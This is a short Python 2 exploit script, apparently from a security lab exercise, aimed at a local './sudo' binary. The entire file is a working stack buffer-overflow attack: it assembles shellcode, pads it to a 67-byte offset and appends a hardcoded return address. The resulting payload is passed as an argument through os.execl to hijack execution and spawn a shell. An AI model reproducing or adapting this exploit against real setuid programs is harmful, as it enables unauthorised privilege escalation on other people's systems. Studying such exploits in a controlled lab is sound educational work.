import os, sys
import assemble

PATH_TO_SUDO = './sudo'

EIP_OFFEST = 67
EIP = "\x29\xe0\xff\xbf" #shellcode start is at 0xbfffe01c + 13 = 0xbfffe01c + 0xD = 0xbfffe029

def run_shell():
    shellcode = list(assemble.assemble_file("shellcode.asm"))
    shellcode[-1]='\x01' #change the last byte from null so python won't scream at me
    shellcode = ''.join(shellcode)
    exploit = shellcode + "P"*(EIP_OFFEST-len(shellcode)) + EIP
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO ,exploit, "");


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
